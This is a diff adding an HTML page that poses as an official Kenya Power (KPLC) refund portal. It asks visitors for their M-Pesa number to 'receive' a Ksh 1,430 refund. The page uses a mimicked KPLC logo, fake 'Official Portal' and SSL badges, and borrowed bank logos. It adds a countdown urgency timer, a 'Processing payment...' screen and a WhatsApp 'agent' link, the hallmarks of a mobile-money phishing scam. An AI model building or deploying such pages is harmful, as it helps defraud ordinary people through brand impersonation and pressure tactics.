@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-gray-50">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KPLC Refund — Payment</title>
+  <link rel="stylesheet" href="/main.css">
+  <link rel="icon" href="/assets/kplc-favicon.png">
+</head>
+<body class="h-full flex flex-col min-h-screen bg-gradient-to-b from-blue-50 to-white" data-page-script="payment">
+  <div class="w-full max-w-md mx-auto px-3 sm:px-4 py-4 sm:py-8 flex flex-col gap-4 sm:gap-6">
+    <div class="flex flex-col items-center gap-2">
+      <img src="/assets/kplc-logo-mimic.svg" alt="KPLC Logo" class="h-10 sm:h-12">
+      <span class="flex items-center gap-2 text-xs text-gray-500 mt-1">
+        <img src="/assets/ssl-badge.svg" class="h-3 sm:h-4"> <img src="/assets/kenya-flag.svg" class="h-3 sm:h-4"> <span>Official KPLC Portal</span>
+      </span>
+    </div>
+    <div class="bg-white rounded-xl shadow-lg px-4 sm:px-6 py-6 sm:py-8 flex flex-col gap-4">
+      <h1 class="text-lg sm:text-xl font-bold text-blue-900 text-center px-2 sm:px-0">Enter your M-Pesa number to receive your <span class="text-green-600">Ksh 1,430</span> refund.</h1>
+      <form x-data="paymentForm()" @submit.prevent="initiatePayment" class="flex flex-col gap-4 mt-4 relative">
+        <label class="block">
+          <span class="text-gray-600 font-medium">M-Pesa Number</span>
+          <input type="tel" x-model="phone" maxlength="10" placeholder="07xx xxx xxx" required pattern="07[0-9]{8}" class="mt-1 w-full rounded-xl border border-gray-200 px-3 sm:px-4 py-2 sm:py-3 focus:outline-none focus:ring-2 focus:ring-green-400 text-base sm:text-lg bg-white/90 shadow-inner transition-all duration-200" autocomplete="on">
+        </label>
+        <button type="submit" x-show="!loading" class="w-full bg-gradient-to-r from-green-500 via-green-600 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-extrabold rounded-xl py-2 sm:py-3 text-base sm:text-lg shadow-xl transition-all duration-200 animate-bounce-cta">Verify & Receive Refund</button>
+        <div x-show="loading" class="flex flex-col items-center justify-center gap-2 py-4 animate-fade-in">
+          <svg class="animate-spin h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path></svg>
+          <span class="text-green-700 font-semibold">Processing payment...</span>
+          <div class="w-full bg-green-100 rounded-full h-2 mt-2 overflow-hidden">
+            <div class="bg-gradient-to-r from-green-400 to-blue-400 h-2 rounded-full transition-all duration-700" :style="'width:'+progress+'%'"></div>
+          </div>
+          <span class="text-xs text-gray-500 mt-1">Do not close this window or press back</span>
+        </div>
+      </form>
+      <div class="flex justify-center items-center gap-2 sm:gap-4 mt-6 pt-4 border-t border-gray-200">
+        <img src="https://play-lh.googleusercontent.com/bRZF74-13jknePwUd1xam5ZCSdAJVuI_wqtkrisBgu7EEh1jobh2boZihlk-4ikY_S3V" alt="M-Pesa" class="h-6 sm:h-8 object-contain">
+        <img src="https://biznakenya.com/wp-content/uploads/2017/04/EQUITYl-1.jpg" alt="Equity Bank" class="h-6 sm:h-8 object-contain">
+        <img src="https://upload.wikimedia.org/wikipedia/en/d/de/KCB_Bank_Kenya_Limited_logo.png" alt="KCB Bank" class="h-6 sm:h-8 object-contain">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZCLJ5eyocLaJaSz-wEwdH9U48iQT9NdvdN2DctDGdnRL0PTJ7Y36UJXpRFZusuIfCOWA&usqp=CAU" alt="KPLC" class="h-6 sm:h-8 object-contain">
+      </div>
+      <span class="text-xs text-orange-600 font-semibold mt-2 animate-timer-blink">Refunds close in <span x-data="countdownTimer(0.5)" x-text="timer"></span>!</span>
+      <div class="bg-yellow-50 rounded-lg px-3 py-2 mt-4 flex items-center gap-2">
+        <img src="/assets/whatsapp.svg" class="h-5"> <span class="text-xs text-gray-700">Having trouble? <a href="https://wa.me/254700000000" class="text-green-700 font-bold underline">Contact our agent</a></span>
+      </div>
+    </div>
+    <div class="fixed bottom-4 left-0 right-0 flex justify-center z-50">
+      <a href="https://wa.me/254700000000" class="bg-green-500 text-white rounded-full px-6 py-3 shadow-lg font-bold flex items-center gap-2 text-lg hover:bg-green-600 transition">
+        <img src="/assets/whatsapp.svg" class="h-6"> Need help? Chat on WhatsApp
+      </a>
+    </div>
+  </div>
+  
+  <script type="module" src="/main.js"></script>
+</body>
+</html>
